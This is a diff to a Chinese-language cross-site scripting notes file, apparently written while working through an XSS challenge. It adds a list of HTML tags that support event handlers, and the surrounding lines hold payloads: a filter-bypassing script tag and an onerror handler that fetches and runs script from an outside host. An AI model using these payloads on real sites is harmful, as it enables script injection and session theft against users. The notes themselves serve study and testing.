@@ -29,6 +29,21 @@ new:
 onwebkitanimationend 
 ontouchmove      移动端手指点击触发
 
+常见的支持事件的标签
+a	定义超链接，用于从一张页面链接到另一张页面,最重要的属性是 href 属性，它指示链接的目标
+article	规定独立的自包含内容一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发
+audio	定义声音，比如音乐或其他音频流
+b	规定粗体文本
+body	定义文档的主体，包含文档的所有内容
+br	只是简单地开始新的一行
+button	定义一个按钮
+iframe	会创建包含另外一个文档的内联框架
+img	向网页中嵌入一幅图像
+select	可创建单选或多选菜单
+style	用于为 HTML 文档定义样式信息
+textarea	标签定义多行的文本输入控件
+video	定义视频，比如电影片段或其他视频流
+
 payload:javascript:alert(1)'1'onerror=jQuery.getScript('//ifo.pw/WenBWc')>2222222
 第二关:
 name=<ScriPT>alert('xss')</ScriPT>
